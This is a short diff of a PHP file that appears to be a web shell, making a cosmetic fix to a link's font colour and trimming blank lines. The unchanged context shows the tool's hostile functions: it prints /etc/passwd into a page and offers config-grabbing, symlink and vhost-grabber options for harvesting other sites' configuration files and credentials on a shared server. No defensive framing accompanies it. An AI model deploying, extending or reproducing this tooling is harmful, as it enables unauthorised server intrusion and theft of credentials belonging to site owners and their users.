@@ -2482,7 +2482,7 @@ elseif ($_GET['do'] == 'configv2') {
             }
 
             if ($_POST['config'] == 'symvhost') {
-                echo "<center><a href='".$full."/kuda_symvhost/root/'>Symlink Vhost</font></a><br><a href='".$full."/kuda_symvhost/' target='_blank'><font color='lime'>Configurations</font></a></center>";
+                echo "<center><a href='".$full."/kuda_symvhost/root/'><font color='lime'>Symlink Vhost</font></a><br><a href='".$full."/kuda_symvhost/' target='_blank'><font color='lime'>Configurations</font></a></center>";
             }
         }
     } else {
@@ -2491,19 +2491,15 @@ echo "<center>";
 echo "<textarea name=\"passwd\" class=\"area\" rows=\"15\" cols=\"60\">";
 echo include("/etc/passwd");
 echo "</textarea>";
-echo "  
-  
+echo "
 ";
-
 echo "<select class=\"select\" name=\"config\" style=\"width: 450px;\">";
 echo "<option value=\"grab\">Config Grab</option>";
 echo "<option value=\"symlink\">Symlink Config</option>";
 echo "<option value=\"404\">Config 404</option>";
 echo "<option value=\"symvhosts\">Vhosts Config Grabber</option>";
 echo "</select>";
-
-echo "  
-  
+echo "
 ";
 echo "<input type=\"submit\" value=\"Start!\">";
 echo "</center>";
